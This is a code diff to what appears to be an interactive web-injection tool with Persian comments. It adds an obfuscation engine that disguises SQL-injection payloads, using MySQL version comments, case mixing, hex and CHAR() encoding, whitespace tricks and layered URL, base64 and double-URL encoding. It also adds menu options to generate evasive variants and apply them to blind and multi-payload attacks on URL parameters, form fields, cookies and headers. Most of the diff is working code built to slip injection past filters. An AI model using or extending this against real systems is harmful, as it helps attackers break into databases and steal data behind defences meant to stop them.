@@ -4,6 +4,10 @@ from urllib.parse import quote
 import sys, os, re, time, hashlib, itertools
 import importlib.util
 from time import perf_counter
+import json
+from xml.sax.saxutils import escape as _xml_escape
+import random
+import base64
 
 
 # Optional deps
@@ -67,6 +71,33 @@ def escape_html(s: str) -> str:
              .replace('"', "&quot;")
              .replace("'", "&#39;"))
 
+def json_escape_str(s: str) -> str:
+    # فقط بخش داخل کوتیشن JSON را می‌سازد (بدون کوتیشن‌های اطراف)
+    return json.dumps(s)[1:-1]
+
+def xml_escape_str(s: str) -> str:
+    return _xml_escape(s, entities={"'": "&apos;", '"': "&quot;"})
+
+def js_string_escape(s: str) -> str:
+    # Escape ساده و کاربردی برای قرارگیری داخل رشته JS
+    return (s.replace("\\", "\\\\")
+             .replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t")
+             .replace("\"", "\\\"").replace("'", "\\'")
+             .replace("<", "\\x3c").replace(">", "\\x3e").replace("&", "\\x26"))
+
+def apply_context_escape(s: str, ctx: str) -> str:
+    ctx = (ctx or "raw").lower()
+    if ctx == "json":
+        return json_escape_str(s)
+    if ctx == "xml":
+        return xml_escape_str(s)
+    if ctx == "html":
+        return escape_html(s)
+    if ctx in ("js", "javascript"):
+        return js_string_escape(s)
+    return s  # raw
+
+
 def default_folder_input(prompt_text: str):
     base = os.path.dirname(os.path.abspath(__file__))
     raw = input(prompt_text).strip()
@@ -93,6 +124,378 @@ def timed_send(ic, req, quiet: bool = False, tries_override: int = None):
     r = ic.send(req, quiet=quiet, tries_override=tries_override)
     dt = perf_counter() - t0
     return r, dt
+
+
+# ------------------- Obfuscation helpers -------------------
+class Obfuscator:
+    def __init__(self, dbms=None):
+        self.encoding_policy = None
+        self.dbms = dbms or "generic"
+        self.techniques = {
+            "case_change": self._case_change,
+            "inline_comments": self._inline_comments,
+            "hex_encoding": self._hex_encoding,
+            "char_encoding": self._char_encoding,
+            "unicode_entities": self._unicode_entities,
+            "xml_entities": self._xml_entities,
+            "string_concat": self._string_concat,
+            "parentheses": self._parentheses,
+            "alternative_keywords": self._alternative_keywords,
+            "whitespace_tricks": self._whitespace_tricks
+        }
+        self.safety_rules = {
+        "preserve_token_boundaries": True,  
+        "max_length_increase": 2.0,  
+        "forbidden_patterns": [r"\/\*!\d+", r"--\s*[^\s]"],  
+        "preserve_key_positions": ["SELECT", "FROM", "WHERE", "UNION"]  
+    }
+        self.token_boundaries = {
+        "start": ["'", "\"", "(", " ", "\t", "\n", ",", "=", "<", ">"],
+        "end": ["'", "\"", ")", " ", "\t", "\n", ",", ";", "--", "#", "/*"]
+    }
+        
+        # DBMS-specific configurations
+        self.dbms_config = {
+            "MySQL": {
+                "comment_style": ["/**/", "#", "-- ", "-- -", "/*!00000", "/*!50000", "/*! */"],
+                "string_concat": ["CONCAT", "||", " ", "+"],
+                "alternative_keywords": {
+                    "SELECT": ["SELECT", "SeLeCt", "SELECt", "select", "/*!SELECT*/", "/*!50000SELECT*/"],
+                    "FROM": ["FROM", "FrOm", "from", "/*!FROM*/"],
+                    "WHERE": ["WHERE", "WhErE", "where", "/*!WHERE*/", "WHERE/*!50000*/"],
+                    "UNION": ["UNION", "UnIoN", "union", "/*!UNION*/", "UNiOn all", "UNiOn distinct"],
+                    "OR": ["OR", "||", "or", "/*!OR*/", "Or"],
+                    "AND": ["AND", "&&", "and", "/*!AND*/", "And", "aND"],
+                    "INSERT": ["INSERT", "insert", "/*!INSERT*/", "iNsErT"],
+                    "UPDATE": ["UPDATE", "update", "/*!UPDATE*/", "UpDaTe"],
+                    "DELETE": ["DELETE", "delete", "/*!DELETE*/", "DeLeTe"],
+                    "EXEC": ["EXEC", "exec", "EXECUTE", "execute", "/*!EXEC*/"],
+                    "SLEEP": ["SLEEP", "sleep", "/*!SLEEP*/", "BENCHMARK", "benchmark"],
+                    "INFORMATION_SCHEMA": ["INFORMATION_SCHEMA", "information_schema", "/*!INFORMATION_SCHEMA*/", "infoschema"]
+                },
+                "functions": {
+                    "version": ["version()", "@@version", "/*!version*/()"],
+                    "user": ["user()", "current_user()", "system_user()", "/*!user*/()"],
+                    "database": ["database()", "/*!database*/()"],
+                    "concat": ["CONCAT", "CONCAT_WS", "GROUP_CONCAT", "/*!CONCAT*/"]
+                }
+            },
+            "PostgreSQL": {
+                "comment_style": ["/**/", "-- ", "-- -"],
+                "string_concat": ["||", "CONCAT", " "],
+                "alternative_keywords": {
+                    "SELECT": ["SELECT", "select", "SeLeCt"],
+                    "FROM": ["FROM", "from", "FrOm"],
+                    "WHERE": ["WHERE", "where", "WhErE"],
+                    "UNION": ["UNION", "union", "UnIoN", "UNION ALL", "UNION DISTINCT"],
+                    "OR": ["OR", "or", "Or"],
+                    "AND": ["AND", "and", "aND"],
+                    "CURRENT_DATABASE": ["CURRENT_DATABASE", "current_database"],
+                    "VERSION": ["VERSION", "version"]
+                }
+            },
+        }
+
+    def _is_token_boundary(self, text, position):
+        if position == 0 or position == len(text) - 1:
+            return True
+            
+        prev_char = text[position-1]
+        next_char = text[position+1] if position + 1 < len(text) else ""
+        
+        return (prev_char in self.token_boundaries["start"] or 
+                next_char in self.token_boundaries["end"])
+
+    def _preserve_keyword_positions(self, text, keyword):
+        pattern = re.compile(re.escape(keyword), re.IGNORECASE)
+        positions = []
+        
+        for match in pattern.finditer(text):
+            start, end = match.span()
+            if (start == 0 or text[start-1] in self.token_boundaries["start"]) and \
+            (end == len(text) or text[end] in self.token_boundaries["end"]):
+                positions.append((start, end))
+        
+        return positions
+
+    def obfuscate_advanced(self, payload, techniques=None, intensity=0.5, 
+                        max_iterations=3, char_budget=None):
+        
+        if not techniques:
+            techniques = list(self.techniques.keys())
+            
+        current = payload
+        applied_techniques = []
+        original_length = len(payload)
+        
+        max_allowed_length = original_length * self.safety_rules["max_length_increase"]
+        if char_budget:
+            max_allowed_length = min(max_allowed_length, original_length + char_budget)
+        
+        preserved_positions = {}
+        for keyword in self.safety_rules["preserve_key_positions"]:
+            preserved_positions[keyword] = self._preserve_keyword_positions(current, keyword)
+        
+        for iteration in range(max_iterations):
+            if len(current) > max_allowed_length:
+                break
+                
+            technique_name = random.choice(techniques)
+            if random.random() < intensity:
+                technique = self.techniques[technique_name]
+                new_payload = technique(current, intensity)
+                
+                if self.safety_rules["preserve_token_boundaries"]:
+                    pass
+                    
+                if any(re.search(pattern, new_payload) for pattern in self.safety_rules["forbidden_patterns"]):
+                    continue
+                    
+                if new_payload != current:
+                    current = new_payload
+                    applied_techniques.append(technique_name)
+        
+        if hasattr(self, 'encoding_policy') and self.encoding_policy:
+            current = self._apply_encoding_layers(current, self.encoding_policy)
+        
+        return current, applied_techniques
+
+    def _apply_encoding_layers(self, text, encoding_policy=None):
+        
+        if not encoding_policy:
+            return text
+        
+        result = text
+        for encoding_type in encoding_policy:
+            if encoding_type == "url":
+                result = quote(result, safe="")
+            elif encoding_type == "html":
+                result = escape_html(result)
+            elif encoding_type == "base64":
+                result = base64.b64encode(result.encode()).decode()
+            elif encoding_type == "hex":
+                result = "".join([f"%{ord(c):02x}" for c in result])
+            elif encoding_type == "unicode":
+                result = "".join([f"&#{ord(c)};" for c in result])
+            elif encoding_type == "double_url":
+                result = quote(quote(result, safe=""), safe="")
+        
+        return result
+
+    def set_encoding_policy(self, policy):
+        """Set default encoding policy for all obfuscations"""
+        self.encoding_policy = policy
+
+    # if hasattr(self, 'encoding_policy') and self.encoding_policy:
+    #     current = self._apply_encoding_layers(current, self.encoding_policy)
+
+
+    def set_dbms(self, dbms):
+        self.dbms = dbms if dbms in self.dbms_config else "generic"
+
+    def _case_change(self, text, intensity=0.5):
+        """Random case changing with intensity control"""
+        result = []
+        for char in text:
+            if char.isalpha() and random.random() < intensity:
+                result.append(char.lower() if char.isupper() else char.upper())
+            else:
+                result.append(char)
+        return ''.join(result)
+
+    def _inline_comments(self, text, intensity=0.3):
+        """Add random inline comments"""
+        if not text.strip():
+            return text
+            
+        config = self.dbms_config[self.dbms]
+        words = text.split()
+        result = []
+        
+        for i, word in enumerate(words):
+            result.append(word)
+            if random.random() < intensity and i < len(words) - 1:
+                comment = random.choice(config["comment_style"])
+                result.append(comment)
+                
+        return ' '.join(result)
+
+    def _hex_encoding(self, text, intensity=0.2):
+        """Convert parts to hex encoding"""
+        if len(text) < 3:
+            return text
+            
+        result = []
+        i = 0
+        while i < len(text):
+            if random.random() < intensity and i + 2 < len(text):
+                # Encode 2-4 characters as hex
+                length = random.randint(2, 4)
+                segment = text[i:i+length]
+                hex_segment = ''.join([f"{ord(c):02x}" for c in segment])
+                result.append(f"0x{hex_segment}")
+                i += length
+            else:
+                result.append(text[i])
+                i += 1
+                
+        return ''.join(result)
+
+    def _char_encoding(self, text, intensity=0.2):
+        """Convert to CHAR() encoding"""
+        if not text:
+            return text
+            
+        result = []
+        for char in text:
+            if random.random() < intensity and char.isprintable():
+                if self.dbms == "MySQL":
+                    result.append(f"CHAR({ord(char)})")
+                elif self.dbms == "MSSQL":
+                    result.append(f"CHAR({ord(char)})")
+                else:
+                    result.append(char)
+            else:
+                result.append(char)
+                
+        return ''.join(result)
+
+    def _unicode_entities(self, text, intensity=0.1):
+        """Convert to Unicode entities"""
+        result = []
+        for char in text:
+            if random.random() < intensity:
+                result.append(f"&#{ord(char)};")
+            else:
+                result.append(char)
+        return ''.join(result)
+
+    def _xml_entities(self, text, intensity=0.1):
+        """Convert to XML entities"""
+        xml_entities = {
+            '<': '&lt;',
+            '>': '&gt;',
+            '&': '&amp;',
+            '"': '&quot;',
+            "'": '&apos;'
+        }
+        
+        result = []
+        for char in text:
+            if random.random() < intensity and char in xml_entities:
+                result.append(xml_entities[char])
+            else:
+                result.append(char)
+        return ''.join(result)
+
+    def _string_concat(self, text, intensity=0.3):
+        """Break strings using concatenation"""
+        if len(text) < 4:
+            return text
+            
+        config = self.dbms_config[self.dbms]
+        concat_op = random.choice(config["string_concat"])
+        
+        parts = []
+        current = ""
+        for char in text:
+            if random.random() < intensity and current:
+                parts.append(f"'{current}'")
+                current = ""
+            current += char
+        
+        if current:
+            parts.append(f"'{current}'")
+            
+        if len(parts) > 1:
+            return concat_op.join(parts)
+        return text
+
+    def _parentheses(self, text, intensity=0.4):
+        """Add extra parentheses"""
+        words = text.split()
+        if len(words) < 2:
+            return text
+            
+        result = []
+        open_count = 0
+        
+        for i, word in enumerate(words):
+            if random.random() < intensity and open_count == 0:
+                result.append(f"({word}")
+                open_count += 1
+            elif random.random() < intensity and open_count > 0 and i > 0:
+                result.append(f"{word})")
+                open_count -= 1
+            else:
+                result.append(word)
+                
+        # Close any open parentheses
+        while open_count > 0:
+            result[-1] = result[-1] + ")"
+            open_count -= 1
+            
+        return ' '.join(result)
+
+    def _alternative_keywords(self, text, intensity=0.3):
+        """Use alternative keywords"""
+        config = self.dbms_config[self.dbms]
+        words = text.split()
+        result = []
+        
+        for word in words:
+            upper_word = word.upper()
+            if upper_word in config["alternative_keywords"] and random.random() < intensity:
+                result.append(random.choice(config["alternative_keywords"][upper_word]))
+            else:
+                result.append(word)
+                
+        return ' '.join(result)
+
+    def _whitespace_tricks(self, text, intensity=0.5):
+        """Add random whitespace"""
+        result = []
+        for char in text:
+            result.append(char)
+            if random.random() < intensity:
+                # Add random whitespace
+                whitespace = random.choice([' ', '\t', '\n', '\r', '\x0b', '\x0c'])
+                result.append(whitespace)
+                
+        return ''.join(result)
+
+    def obfuscate(self, payload, techniques=None, intensity=0.5, max_iterations=3):
+        if not techniques:
+            techniques = list(self.techniques.keys())
+            
+        current = payload
+        applied_techniques = []
+        
+        for _ in range(max_iterations):
+            # Randomly select a technique to apply
+            technique_name = random.choice(techniques)
+            if random.random() < intensity:
+                technique = self.techniques[technique_name]
+                new_payload = technique(current, intensity)
+                
+                # Only keep if it changed something
+                if new_payload != current:
+                    current = new_payload
+                    applied_techniques.append(technique_name)
+        
+        return current, applied_techniques
+
+    def generate_variants(self, payload, count=5, techniques=None, intensity=0.5):
+        """Generate multiple obfuscated variants"""
+        variants = []
+        for i in range(count):
+            variant, techniques_used = self.obfuscate(payload, techniques, intensity)
+            variants.append({
+                "payload": variant,
+                "techniques": techniques_used,
+                "label": f"obf_{i+1}"
+            })
+        return variants
 
 
 # ---------- placeholder helpers ----------
@@ -291,6 +694,79 @@ class InputCollector:
         self.encode_cookies = "auto"   # "auto" | "encode" | "raw"
         self.encode_headers = "auto"   # "auto" | "encode" | "raw"
         self.set_url(url)
+        self.context_mode = "raw"  # raw | json | xml | html | js
+
+    def preview_transform(self, key: str, payload_str: str):
+        raw = str(payload_str)
+        ctx = apply_context_escape(raw, getattr(self, "context_mode", "raw"))
+        pt = self.prepared_data["type"] if self.prepared_data else None
+        final = ctx
+
+        try:
+            if pt == "url":
+                parsed = self.prepared_data["parsed"]
+                params = {k: v[:] for k, v in self.prepared_data["params"].items()}
+                orig = self.original_values.get(key, "")
+                val  = (orig + ctx) if (self.injection_mode == "append") else ctx
+                params[key] = [val]
+                new_query = urlencode(params, doseq=True)
+                final_url = urlunparse(parsed._replace(query=new_query))
+                final = final_url
+
+            elif pt == "post":
+                fields = self.prepared_data["fields"].copy()
+                orig = self.original_values.get(key, "")
+                val  = (orig + ctx) if (self.injection_mode == "append") else ctx
+                fields[key] = val
+                method = self.prepared_data.get("method", "POST").upper()
+                action_url = self.prepared_data.get("action_url", self.url)
+                if method == "GET":
+                    parsed = urlparse(action_url)
+                    base_params = dict(parse_qsl(parsed.query, keep_blank_values=True))
+                    base_params.update(fields)
+                    new_query = urlencode(base_params, doseq=True)
+                    final = urlunparse(parsed._replace(query=new_query))
+                else:
+                    final = f"{action_url} | data=" + urlencode(fields)
+
+            elif pt == "cookie":
+                cookies = self.prepared_data["cookies"].copy()
+                orig = str(self.original_values.get(key, ""))
+                use_encode = (
+                    self.encode_cookies == "encode" or
+                    (self.encode_cookies == "auto" and looks_encoded(orig))
+                )
+                payload_piece = quote(ctx, safe="") if use_encode else ctx
+                val = (orig + payload_piece) if (self.injection_mode == "append") else payload_piece
+                cookies[key] = val
+                final = f"{self.url} | Cookie {key}={cookies[key]}"
+
+            elif pt == "header":
+                headers = self.prepared_data["headers"].copy()
+                orig = str(self.original_values.get(key, ""))
+                use_encode = (
+                    self.encode_headers == "encode" or
+                    (self.encode_headers == "auto" and looks_encoded(orig))
+                )
+                payload_piece = quote(ctx, safe="") if use_encode else ctx
+                val = (orig + payload_piece) if (self.injection_mode == "append") else payload_piece
+                headers[key] = val
+                final = f"{self.url} | Header {key}: {headers[key]}"
+
+        except Exception as e:
+            final = f"[preview-error] {e}"
+
+        return {"RAW": raw, "CTX": ctx, "FINAL": final}
+
+
+    def set_context_mode(self, mode: str):
+        mode = (mode or "raw").lower()
+        if mode not in {"raw", "json", "xml", "html", "js"}:
+            print("[-] Invalid context mode. Using raw.")
+            mode = "raw"
+        self.context_mode = mode
+        print(f"[*] context_mode -> {self.context_mode}")
+
 
     def set_url(self, url):
         if not (url.startswith("http://") or url.startswith("https://")):
@@ -549,11 +1025,13 @@ class InputCollector:
     def _build_one(self, key, payload_str):
         pt = self.prepared_data["type"]
         p = str(payload_str)
+        # 1) Context escape (RAW -> JSON/XML/HTML/JS)
+        p_ctx = apply_context_escape(p, getattr(self, "context_mode", "raw"))
         try:
             if pt == "url":
                 params = {k: v[:] for k, v in self.prepared_data["params"].items()}
                 orig = self.original_values.get(key, "")
-                val  = (orig + p) if (self.injection_mode == "append") else p
+                val  = (orig + p_ctx) if (self.injection_mode == "append") else p_ctx
                 params[key] = [val]
                 new_query = urlencode(params, doseq=True)
                 new_url = urlunparse(self.prepared_data["parsed"]._replace(query=new_query))
@@ -562,7 +1040,7 @@ class InputCollector:
             if pt == "post":
                 fields = self.prepared_data["fields"].copy()
                 orig = self.original_values.get(key, "")
-                val  = (orig + p) if (self.injection_mode == "append") else p
+                val  = (orig + p_ctx) if (self.injection_mode == "append") else p_ctx
                 fields[key] = val
                 method = self.prepared_data.get("method", "POST").upper()
                 action_url = self.prepared_data.get("action_url", self.url)
@@ -582,7 +1060,7 @@ class InputCollector:
                     self.encode_cookies == "encode" or
                     (self.encode_cookies == "auto" and looks_encoded(orig))
                 )
-                payload_piece = quote(p, safe="") if use_encode else p
+                payload_piece = quote(p_ctx, safe="") if use_encode else p_ctx
                 val = (orig + payload_piece) if (getattr(self, "injection_mode", "append") == "append") else payload_piece
                 cookies[key] = val
                 return {"url": self.url, "method": "GET", "cookies": cookies}
@@ -591,12 +1069,11 @@ class InputCollector:
             if pt == "header":
                 headers = self.prepared_data["headers"].copy()
                 orig = str(self.original_values.get(key, ""))
-                # تصمیم برای انکود payload بر اساس سوییچ
                 use_encode = (
                     self.encode_headers == "encode" or
                     (self.encode_headers == "auto" and looks_encoded(orig))
                 )
-                payload_piece = quote(p, safe="") if use_encode else p
+                payload_piece = quote(p_ctx, safe="") if use_encode else p_ctx
                 val = (orig + payload_piece) if (getattr(self, "injection_mode", "append") == "append") else payload_piece
                 headers[key] = val
                 return {"url": self.url, "method": "GET", "headers": headers}
@@ -806,7 +1283,7 @@ def scan_errors(text: str, compiled_errs):
 
 
 # ------------------- Blind runner (enhanced reporting) -------------------
-def run_blind_user_payload(ic):
+def run_blind_user_payload(ic, obfuscator):
     
     if not ic or not ic.prepared_data or not ic.selected_keys:
         print("[-] No inputs selected. Use option 2 first.")
@@ -838,6 +1315,13 @@ def run_blind_user_payload(ic):
     else:
         print("[-] Invalid mode.")
         return
+
+    apply_obf = input("Apply obfuscation to blind payloads? (y/n): ").strip().lower()
+    if apply_obf in ("y", "yes", "1", "۱"):
+        for label in list(payload_map.keys()):
+            payload_map[label], applied_tech = obfuscator.obfuscate(payload_map[label])
+            print(f"[*] Obfuscated {label}: {payload_map[label]}")
+            print(f"[*] Techniques applied: {', '.join(applied_tech)}")
 
     # جمع placeholder ها
     vars_all = []
@@ -1808,6 +2292,7 @@ def main():
     ic = None
     last_prepared = {}   # label -> request dict
     last_responses = {}  # label -> response body
+    obfuscator = Obfuscator()
 
     def ensure_ic():
         nonlocal ic
@@ -1839,6 +2324,11 @@ def main():
         print("16) Toggle Injection Mode (append/replace)  [current: {}]".format(getattr(ic, "injection_mode", "append") if ic else "append"))
         print("17) Toggle Cookie Encode Mode (auto/encode/raw)  [current: {}]".format(getattr(ic, "encode_cookies", "auto") if ic else "auto"))
         print("18) Toggle Header Encode Mode (auto/encode/raw)  [current: {}]".format(getattr(ic, "encode_headers", "auto") if ic else "auto"))
+        print("19) Toggle Context Mode (raw/json/xml/html/js)  [current: {}]".format(getattr(ic, "context_mode", "raw") if ic else "raw"))
+        print("20) Preview Transform of a payload on a selected input")
+        print("21) Configure Obfuscation Settings")
+        print("22) Apply Obfuscation to Payload")
+        print("23) Generate Multiple Obfuscated Variants")
         choice = input("> ").strip()
 
         if choice in ("9", "۹"):
@@ -1879,6 +2369,14 @@ def main():
             if not raw:
                 print("[-] Empty payload.")
                 continue
+            apply_obf = input("Apply obfuscation? (y/n): ").strip().lower()
+            if apply_obf in ("y", "yes", "1", "۱"):
+                orig_payload = raw
+                raw, applied_tech = obfuscator.obfuscate_advanced(raw, char_budget=50)
+                print(f"[*] Obfuscated payload: {raw}")
+                print(f"[*] Techniques applied: {', '.join(applied_tech)}")
+                print(f"[*] Length change: {len(raw) - len(orig_payload)} characters")
+
             expanded = expand_single_payload_string(raw)
             if not expanded:
                 print("[-] No expanded payloads.")
@@ -1917,6 +2415,12 @@ def main():
             if not raw_dict:
                 print("[-] No payloads provided.")
                 continue
+            apply_obf = input("Apply obfuscation to all payloads? (y/n): ").strip().lower()
+            if apply_obf in ("y", "yes", "1", "۱"):
+                for label, val in list(raw_dict.items()):
+                    new_val, applied_tech = obfuscator.obfuscate_advanced(val, char_budget=50)
+                    raw_dict[label] = new_val
+                    print(f"[*] Obfuscated {label}: {new_val}  (tech: {', '.join(applied_tech)})")
             expanded_dict = expand_payload_dict(raw_dict)
             if not expanded_dict:
                 print("[-] No expanded payloads.")
@@ -2090,7 +2594,7 @@ def main():
 
         if choice in ("10", "۱۰"):
             ensure_ic()
-            run_blind_user_payload(ic)
+            run_blind_user_payload(ic, obfuscator)
             continue
 
         if choice in ("11", "۱۱"):
@@ -2142,8 +2646,166 @@ def main():
             print(f"[*] encode_headers -> {ic.encode_headers}")
             continue
 
+        if choice in ("19", "۱۹"):
+            ensure_ic()
+            print("Context modes: 1) raw  2) json  3) xml  4) html  5) js")
+            sel = input("> ").strip()
+            mapping = {"1":"raw","2":"json","3":"xml","4":"html","5":"js"}
+            ic.set_context_mode(mapping.get(sel, "raw"))
+            continue
 
+        if choice in ("20", "۲۰"):
+            ensure_ic()
+            if not ic or not ic.prepared_data or not ic.selected_keys:
+                print("[-] No inputs selected. Use option 2 first.")
+                continue
+            keys = ic.selected_keys[:]
+            print("\nSelected inputs:")
+            for i, k in enumerate(keys, 1):
+                print(f"{i}. {k}")
+            try:
+                idx = to_int_safe(input("Pick input index to preview: "), 1, len(keys)) - 1
+            except Exception:
+                print("[-] Invalid index.")
+                continue
+            kname = keys[idx]
+            payload = input("Enter a RAW payload to preview: ").strip()
+            if not payload:
+                print("[-] Empty payload.")
+                continue
+            prev = ic.preview_transform(kname, payload)
+            print("\n[Preview]")
+            print("RAW   :", prev["RAW"])
+            print("CTX   :", prev["CTX"], f"  (context={ic.context_mode})")
+            print("FINAL :", prev["FINAL"])
+            continue
+
+        if choice in ("21", "۲۱"):
+            print("\n=== Obfuscation Configuration ===")
+            print("1) Set Target DBMS")
+            print("2) View Available Techniques") 
+            print("3) Set Default Intensity")
+            print("4) Set Encoding Policy")
+            print("5) Set Safety Rules")
+            print("6) Back to Main")
+            
+            obf_choice = input("> ").strip()
+            if obf_choice == "1":
+                dbms_options = list(obfuscator.dbms_config.keys())
+                for i, dbms in enumerate(dbms_options, 1):
+                    print(f"{i}. {dbms}")
+                try:
+                    dbms_sel = to_int_safe(input("Select DBMS: "), 1, len(dbms_options))
+                    obfuscator.set_dbms(dbms_options[dbms_sel-1])
+                    print(f"[*] DBMS set to: {dbms_options[dbms_sel-1]}")
+                except:
+                    print("[-] Invalid selection")
+                    
+            elif obf_choice == "2":
+                print("\nAvailable Obfuscation Techniques:")
+                for i, tech in enumerate(obfuscator.techniques.keys(), 1):
+                    print(f"{i}. {tech}")
+                    
+            elif obf_choice == "3":
+                try:
+                    intensity = float(input("Intensity (0.0-1.0): ").strip())
+                    if 0.0 <= intensity <= 1.0:
+                        obfuscator.default_intensity = intensity
+                        print(f"[*] Intensity set to: {intensity}")
+                    else:
+                        print("[-] Must be between 0.0 and 1.0")
+                except:
+                    print("[-] Invalid number")
+            elif obf_choice == "4":
+                print("\nEncoding Policy (comma-separated, e.g., url,html,base64):")
+                print("Available: url, html, base64, hex, unicode, double_url")
+                policy_input = input("> ").strip()
+                if policy_input:
+                    policy = [p.strip() for p in policy_input.split(",")]
+                    obfuscator.set_encoding_policy(policy)
+                    print(f"[*] Encoding policy set to: {policy}")
+            elif obf_choice == "5":
+                print("\nSafety Rules Configuration:")
+                print("1) Toggle token boundary preservation")
+                print("2) Set max length increase factor")
+                print("3) Back")
+                
+                safety_choice = input("> ").strip()
+                if safety_choice == "1":
+                    current = obfuscator.safety_rules["preserve_token_boundaries"]
+                    obfuscator.safety_rules["preserve_token_boundaries"] = not current
+                    print(f"[*] Token boundary preservation: {not current}")
+                elif safety_choice == "2":
+                    try:
+                        factor = float(input("Max length increase factor (e.g., 2.0): ").strip())
+                        obfuscator.safety_rules["max_length_increase"] = factor
+                        print(f"[*] Max length increase factor set to: {factor}")
+                    except:
+                        print("[-] Invalid number")
+                        continue
+            continue
+        
+        if choice in ("22", "۲۲"):
+            payload = input("Enter payload to obfuscate: ").strip()
+            if not payload:
+                print("[-] Empty payload")
+                continue
+                
+            print("\nSelect techniques (comma-separated, or 'all'):")
+            techniques = list(obfuscator.techniques.keys())
+            for i, tech in enumerate(techniques, 1):
+                print(f"{i}. {tech}")
+                
+            tech_sel = input("> ").strip().lower()
+            selected_techs = []
+            if tech_sel in ("all", "*", ""):
+                selected_techs = techniques
+            else:
+                try:
+                    indices = parse_multi_indices(tech_sel, len(techniques))
+                    selected_techs = [techniques[i-1] for i in indices]
+                except:
+                    print("[-] Invalid selection, using all")
+                    selected_techs = techniques
+            
+            try:
+                intensity = float(input("Intensity (0.0-1.0) [0.5]: ").strip() or "0.5")
+            except:
+                intensity = 0.5
+                
+            obfuscated, applied = obfuscator.obfuscate(payload, selected_techs, intensity)
+            print(f"\nOriginal: {payload}")
+            print(f"Obfuscated: {obfuscated}")
+            print(f"Techniques applied: {', '.join(applied)}")
+            
+            # ذخیره برای استفاده بعدی
+            last_obfuscated = obfuscated
+            continue
+        
+        if choice in ("23", "۲۳"):
+            payload = input("Enter payload to generate variants: ").strip()
+            if not payload:
+                print("[-] Empty payload")
+                continue
+                
+            try:
+                count = int(input("Number of variants [5]: ").strip() or "5")
+            except:
+                count = 5
+                
+            try:
+                intensity = float(input("Intensity (0.0-1.0) [0.5]: ").strip() or "0.5")
+            except:
+                intensity = 0.5
+                
+            variants = obfuscator.generate_variants(payload, count, None, intensity)
+            print(f"\nGenerated {len(variants)} variants:")
+            for i, variant in enumerate(variants, 1):
+                print(f"\n{i}. {variant['payload']}")
+                print(f"   Techniques: {', '.join(variant['techniques'])}")
+                continue
         print("[-] Invalid choice.")
+        continue
 
 
 if __name__ == "__main__":
